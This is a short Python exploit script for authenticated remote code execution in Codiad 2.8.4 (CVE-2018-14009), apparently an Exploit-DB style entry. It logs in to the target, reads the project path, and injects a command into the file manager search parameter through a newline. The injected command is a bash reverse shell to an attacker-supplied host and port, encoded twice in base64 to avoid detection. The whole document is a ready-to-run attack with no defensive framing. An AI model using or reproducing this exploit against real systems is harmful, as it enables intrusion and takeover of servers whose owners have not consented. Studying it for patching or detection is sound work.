# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009
# Edit by 20100dbg

import requests
import sys
import json
import base64

if len(sys.argv) != 6:
    print(f"Usage : python {sys.argv[0]} [URL] [USERNAME] [PASSWORD] [IP] [PORT]")
    exit(1)

url = sys.argv[1].rstrip('/')
username = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = int(sys.argv[5])

session = requests.Session()

tmpurl = f"{url}/components/user/controller.php?action=authenticate"
data = {
    "username": username,
    "password": password,
    "theme": "default",
    "language": "en"
}
response = session.post(tmpurl, data=data, verify=False)

if 'status":"success"' in response.text:
    print("logged in !")


tmpurl = f"{url}/components/project/controller.php?action=get_current"
response = session.get(tmpurl, verify=False)
json_obj = json.loads(response.text)

if json_obj['status'] == "success":
    path = json_obj['data']['path']

tmpurl = f"{url}/components/filemanager/controller.php?type=1&action=search&path={path}"


payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()
payload = base64.b64encode(payload)
payload = base64.b64encode(payload)
payload = f'"%0Aecho {payload.decode()} | base64 -d | base64 -d | bash %23'

payload = "search_string=Hacker&search_file_type=" + payload
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
response = session.post(tmpurl, data=payload, headers=headers, verify=False)
content = response.text
print(content)


